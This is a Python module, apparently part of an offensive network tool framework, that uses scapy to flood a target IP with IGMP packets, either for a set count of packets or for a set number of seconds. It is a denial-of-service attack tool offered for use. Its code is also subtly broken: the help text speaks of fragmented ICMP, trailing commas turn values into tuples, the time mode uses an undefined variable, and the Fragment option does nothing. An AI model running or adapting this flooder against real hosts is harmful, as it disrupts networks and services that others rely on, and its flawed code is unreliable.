from scapy.all import *

from lib.cmd_tool import *

NAME = 'IgmpFlood'

class Module:
    def __init__(self):
        self.config = {
            'IP': {
                'value': '',
                'help': 'Target IP',
            },
            'Count': {
                'value': '100',
                'help': 'Send packet count.',
            },
            'Time': {
                'value': '10',
                'help': 'Stop flooding after specified seconds.'
            },
            'Fragment': {
                'value': 'true',
                'help': 'Enable fragment ICMP packet.',
            },
            'Mode': {
                'value': '0',
                'help': '',
                'option': {
                    MODE_COUNT: '',
                    MODE_TIME: '',
                }
            },
        }

        self.help = ''

    def validate(self) -> bool:
        szIP = get_value(self.config, 'IP')
        szCount = get_value(self.config, 'Count'),
        szTime = get_value(self.config, 'Time'),
        szFragment = get_value(self.config, 'Fragment')
        szMode = get_value(self.config, 'Mode')

        if not szIP:
            cp.pf_failed('IP is null or empty.')
            return False
        
        if not isNonPositiveInt(szCount):
            cp.pf_failed('Invalid count.')
            return False
        
        if not isNonPositiveInt(szTime):
            cp.pf_failed('Invalid time.')
            return False
        
        if not bool(szFragment):
            cp.pf_failed('Invalid boolean value of \'Fragment\'.')
            return False
        
        if not isNonPositiveInt(szMode):
            cp.pf_failed('Invalid mode value.')
            return False

        return True

    def interactive(self):
        interactive(self, 'igmp_flood')

    def run(self):
        def igmp_flood(ip: str):
            pkt = IP(dst=ip) / IGMP()
            send(pkt, verbose=False)

        try:
            lsIP = str2strls(get_value(self.config, 'IP'))
            nCnt = int(get_value(self.config, 'Count'))
            nTime = int(get_value(self.config, 'Time'))
            nMode = int(get_value(self.config, 'Mode'))
           
            total = 0

            if nMode == MODE_COUNT:
                for ip in lsIP:
                    for _ in range(0, nCnt):
                        igmp_flood(ip)
                        total += 1
            
            elif nMode == MODE_TIME:
                total = doWorkWithSeconds(igmp_flood, nTime, {'ip': ip})
            
            cp.pf_ok(f'Done, total: {total}')

        except Exception as ex:
            cp.pf_failed(str(ex))